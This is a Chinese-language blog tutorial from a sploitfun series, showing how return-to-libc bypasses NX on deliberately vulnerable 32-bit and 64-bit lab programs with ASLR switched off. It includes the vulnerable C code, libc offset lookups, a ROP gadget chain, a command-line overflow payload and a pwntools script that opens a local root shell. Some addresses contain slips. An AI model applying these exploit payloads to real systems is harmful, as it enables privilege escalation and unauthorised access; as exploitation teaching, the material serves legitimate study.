---
layout: post
title: 通过return-to-libc绕过NX
excerpt: "sploitfun系列教程之2.1 return-to-libc"
categories: [sploitfun系列教程]
comments: true
---


#### 什么是NX防护
NX:No Execute,这个防护开启就意味着变量、栈、堆中数据没有执行权限而且代码空间没有写入的权限

漏洞代码
```c
 //vuln.c
#include <stdio.h>
#include <string.h>

int main(int argc, char* argv[]) {
 char buf[256]; /* [1] */ 
 strcpy(buf,argv[1]); /* [2] */
 printf("%s\n",buf); /* [3] */
 fflush(stdout);  /* [4] */
 return 0;
}
```
编译
```shell
echo 0 > /proc/sys/kernel/randomize_va_space
gcc -g -fno-stack-protector -o vuln vuln.c -m32
chmod 777 vuln
```
运行`readelf -l vuln`查看栈空间的权限
```
...
...
  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
  PHDR           0x000034 0x08048034 0x08048034 0x00120 0x00120 R E 0x4
  INTERP         0x000154 0x08048154 0x08048154 0x00013 0x00013 R   0x1
      [Requesting program interpreter: /lib/ld-linux.so.2]
  LOAD           0x000000 0x08048000 0x08048000 0x00660 0x00660 R E 0x1000
  LOAD           0x000f08 0x08049f08 0x08049f08 0x00118 0x00120 RW  0x1000
  DYNAMIC        0x000f14 0x08049f14 0x08049f14 0x000e8 0x000e8 RW  0x4
  NOTE           0x000168 0x08048168 0x08048168 0x00044 0x00044 R   0x4
  GNU_EH_FRAME   0x000584 0x08048584 0x08048584 0x0002c 0x0002c R   0x4
  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x10
  GNU_RELRO      0x000f08 0x08049f08 0x08049f08 0x000f8 0x000f8 R   0x1
...
...
```
此时`GNU_STACK`已经没有了E标志位(执行权限)

#### exp编写过程
通过`more /proc/19669/maps`查看libc的基地址
```
08048000-08049000 r-xp 00000000 fd:00 69981924                           /root/sploitfun/vuln
08049000-0804a000 r--p 00000000 fd:00 69981924                           /root/sploitfun/vuln
0804a000-0804b000 rw-p 00001000 fd:00 69981924                           /root/sploitfun/vuln
f7e01000-f7e02000 rw-p 00000000 00:00 0 
f7e02000-f7fc6000 r-xp 00000000 fd:00 34048627                           /usr/lib/libc-2.17.so
f7fc6000-f7fc7000 ---p 001c4000 fd:00 34048627                           /usr/lib/libc-2.17.so
f7fc7000-f7fc9000 r--p 001c4000 fd:00 34048627                           /usr/lib/libc-2.17.so
f7fc9000-f7fca000 rw-p 001c6000 fd:00 34048627                           /usr/lib/libc-2.17.so
f7fca000-f7fcd000 rw-p 00000000 00:00 0 
f7fd8000-f7fd9000 rw-p 00000000 00:00 0 
f7fd9000-f7fda000 r-xp 00000000 00:00 0                                  [vdso]
f7fda000-f7ffc000 r-xp 00000000 fd:00 34036408                           /usr/lib/ld-2.17.so
f7ffc000-f7ffd000 r--p 00021000 fd:00 34036408                           /usr/lib/ld-2.17.so
f7ffd000-f7ffe000 rw-p 00022000 fd:00 34036408                           /usr/lib/ld-2.17.so
fffdd000-ffffe000 rw-p 00000000 00:00 0                                  [stack]
```
得到libc基地址为`f7e02000`

通过`readelf -s /usr/lib/libc-2.17.so | grep system`查看system的offset
```shell
   246: 00132650    73 FUNC    GLOBAL DEFAULT   13 svcerr_systemerr@@GLIBC_2.0
   627: 0003ef70    98 FUNC    GLOBAL DEFAULT   13 __libc_system@@GLIBC_PRIVATE
  1454: 0003ef70    98 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0
   513: 00000000     0 FILE    LOCAL  DEFAULT  ABS system.c
   514: 0003ea40  1089 FUNC    LOCAL  DEFAULT   13 do_system
  5193: 00132650    73 FUNC    LOCAL  DEFAULT   13 __GI_svcerr_systemerr
  7022: 0003ef70    98 FUNC    WEAK   DEFAULT   13 system
  7618: 00132650    73 FUNC    GLOBAL DEFAULT   13 svcerr_systemerr
  7683: 0003ef70    98 FUNC    GLOBAL DEFAULT   13 __libc_system
```
通过`objdump -s /usr/lib/libc-2.17.so |less`查找sh字符并且以00结尾
```
 0e5b8 5f6d6f64 64693300 696e6574 365f6f70  _moddi3.inet6_op
 0e5c8 745f6669 6e697368 005f494f 5f646566  t_finish._IO_def
 0e5d8 61756c74 5f787370 75746e00 5f5f7763  ault_xsputn.__wc
```
得到sh.位置offset为0e5ce,固sh.位置的绝对位置为`0xf7Ee05ce`

我们需要在栈空间进行如下构建
```
 ______
| AAAA |
|------|
| .... |
|------|
| AAAA |
|------|
|SYSTEM|
|------|
| AAAA |
|------|
|  SH  |
|______|
```


最后的结果
```bash
./vuln `python -c 'print "A"*268 + "\x70\x0f\xe4\xf7"+"\xff\xff\xff\xff"+"\xce\x05\xe1\xf7"'`
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAp澉????吾
sh-4.2# exit
exit
```
#### 一点疑问
若程序采用最小权限原则，用户获取输入之前删除root权限。因此，即使用户输入是恶意的，攻击者也不会得到root shell。代码如下
```c
//vuln_priv.c
#include <stdio.h>
#include <string.h>

int main(int argc, char* argv[]) {
 char buf[256];
 seteuid(getuid()); /* Temporarily drop privileges */ 
 strcpy(buf,argv[1]);
 printf("%s\n",buf);
 fflush(stdout);
 return 0;
}
```
那么如何在程序使用了最小权限原则的限制下，获取root权限呢？如果我们的栈空间这样构造，那么pwn之后就可以获取root权限

- seteuid(0)
- system(“sh”)
- exit()

这样我们就可以获得root权限，这种技术叫做chaining of return-to-libc


----

#### 64位版本

代码同上,编译如下

```
echo 0 > /proc/sys/kernel/randomize_va_space
gcc -g -fno-stack-protector -o vuln vuln.c
chmod +x vuln
```

运行`readelf -l vuln`查看栈空间的权限

```
  GNU_STACK      0x0000000000000000 0x0000000000000000 0x0000000000000000
                 0x0000000000000000 0x0000000000000000  RW     10

```

此时GNU_STACK已经没有了E标志位(执行权限)

#### exp编写过程

查看libc基地址

```
more /proc/24416/maps
00400000-00401000 r-xp 00000000 fd:00 34957126                           /root/sploitfun/64/vuln
00600000-00601000 r--p 00000000 fd:00 34957126                           /root/sploitfun/64/vuln
00601000-00602000 rw-p 00001000 fd:00 34957126                           /root/sploitfun/64/vuln
7ffff7a0d000-7ffff7bd0000 r-xp 00000000 fd:00 3001855                    /usr/lib64/libc-2.17.so
7ffff7bd0000-7ffff7dd0000 ---p 001c3000 fd:00 3001855                    /usr/lib64/libc-2.17.so
7ffff7dd0000-7ffff7dd4000 r--p 001c3000 fd:00 3001855                    /usr/lib64/libc-2.17.so
7ffff7dd4000-7ffff7dd6000 rw-p 001c7000 fd:00 3001855                    /usr/lib64/libc-2.17.so
7ffff7dd6000-7ffff7ddb000 rw-p 00000000 00:00 0 
7ffff7ddb000-7ffff7dfd000 r-xp 00000000 fd:00 33560                      /usr/lib64/ld-2.17.so
7ffff7fea000-7ffff7fed000 rw-p 00000000 00:00 0 
7ffff7ff9000-7ffff7ffa000 rw-p 00000000 00:00 0 
7ffff7ffa000-7ffff7ffc000 r-xp 00000000 00:00 0                          [vdso]
7ffff7ffc000-7ffff7ffd000 r--p 00021000 fd:00 33560                      /usr/lib64/ld-2.17.so
7ffff7ffd000-7ffff7ffe000 rw-p 00022000 fd:00 33560                      /usr/lib64/ld-2.17.so
7ffff7ffe000-7ffff7fff000 rw-p 00000000 00:00 0 
7ffffffde000-7ffffffff000 rw-p 00000000 00:00 0                          [stack]
ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]
```

得到libc基地址为`7ffff7a0d000`

通过`readelf -s /usr/lib/libc-2.17.so | grep system`查看system的offset

```
readelf -s /usr/lib64/libc-2.17.so | grep system
   224: 00000000001329b0    70 FUNC    GLOBAL DEFAULT   13 svcerr_systemerr@@GLIBC_2.2.5
   582: 0000000000043270    94 FUNC    GLOBAL DEFAULT   13 __libc_system@@GLIBC_PRIVATE
  1346: 0000000000043270    94 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.2.5
   481: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS system.c
   482: 0000000000042da0  1037 FUNC    LOCAL  DEFAULT   13 do_system
  4383: 00000000001329b0    70 FUNC    LOCAL  DEFAULT   13 __GI_svcerr_systemerr
  6152: 0000000000043270    94 FUNC    WEAK   DEFAULT   13 system
  6723: 00000000001329b0    70 FUNC    GLOBAL DEFAULT   13 svcerr_systemerr
  6784: 0000000000043270    94 FUNC    GLOBAL DEFAULT   13 __libc_system
```

通过`objdump -s /usr/lib64/libc-2.17.so |less`查找sh字符并且以00结尾

```
 11e40 6f615f6c 6f776572 5f646967 69747300  oa_lower_digits.
 11e50 696e6574 365f6f70 745f6669 6e697368  inet6_opt_finish
 11e60 00707468 72656164 5f636f6e 645f696e  .pthread_cond_in
```

得到sh.位置offset为11e5e,固sh.位置的绝对位置为0x7ffff7a1ee5e‬

64位通过寄存器传递参数,所以不需要叠栈空间,前6个参数通过这几个寄存器来传递RDI, RSI, RDX, RCX, R8,和R9
.我们需要使用ROP来将参数放到寄存器中

第一个参数需要在RDI中,我们需要一个ROP gadget将'sh'放到RDI中

通过`ROPgadget --binary vuln |less`查找gadget

```
...skipping...
0x00000000004006c3 : pop rdi ; ret
0x00000000004006c1 : pop rsi ; pop r15 ; ret
```

我们需要在栈空间进行如下构建

```
 _____________
|     AAAA    |
|-------------|
| ........... |
|-------------|
| rerutn addr |pop rdi; ret;
|-------------|
|     addr    |pointer to "/bin/sh" gets popped into rdi
|-------------|
|     addr    |address of system()
|-------------|
|   ........  |
|_____________|
```

offset

```
gdb vuln
r `python -c 'print "A"*270'`
```

结果

```
Stopped reason: SIGSEGV
0x0000414141414141 in ?? ()

```

现在的问题是binary中的`pop rdi ; ret`地址为`0x00000000004006c3`,`strcpy(buf,argv[1])`没有把\x00放进去,只能换个代码演示...

```c
/* Compile: gcc -fno-stack-protector ret2libc.c -o ret2libc      */
/* Disable ASLR: echo 0 > /proc/sys/kernel/randomize_va_space     */

#include <stdio.h>
#include <unistd.h>

int vuln() {
    char buf[80];
    int r;
    r = read(0, buf, 400);
    printf("\nRead %d bytes. buf is %s\n", r, buf);
    puts("No shell for you :(");
    return 0;
}

int main(int argc, char *argv[]) {
    printf("Try to exec /bin/sh");
    vuln();
    return 0;
}
```

编译

```shell
gcc -fno-stack-protector ret2libc.c -o ret2libc
echo 0 > /proc/sys/kernel/randomize_va_space
chmod +x ret2libc
```

**offset查找可以通过rbp值来计算**

相同的方法查找`pop rdi ; ret`地址为`0x00000000004006a3`

ps:可以使用如下方法查找字符串

```
gdb-peda$ find "/bin/sh"
Searching for '/bin/sh' in: None ranges
Found 3 results, display max 3 items:
ret2libc : 0x40070b --> 0x68732f6e69622f ('/bin/sh')
ret2libc : 0x60070b --> 0x68732f6e69622f ('/bin/sh')
    libc : 0x7ffff7b94cc9 --> 0x68732f6e69622f ('/bin/sh')

```
查找system地址并验证
```bash
gdb-peda$ p &system
$1 = (<text variable, no debug info> *) 0x7ffff7a50270 <__libc_system>
gdb-peda$ x/wx 0x7ffff7a50270
0x7ffff7a50270 <__libc_system>:	0x83485355

```
最终exp
```python
from pwn import *

r = remote('127.0.0.1', 4000)

raw_input('#')
payload = 'A' * 104+p64(0x00000000004006a3)+p64(0x40070b)+p64(0x7ffff7a50270)
r.send(payload)
#print r.recvall()
r.interactive()

```
最终结果
```bash
python mortyexp.py 
[+] Opening connection to 127.0.0.1 on port 4000: Done
#
[*] Switching to interactive mode
$ id
uid=0(root) gid=0(root) 组=0(root)
```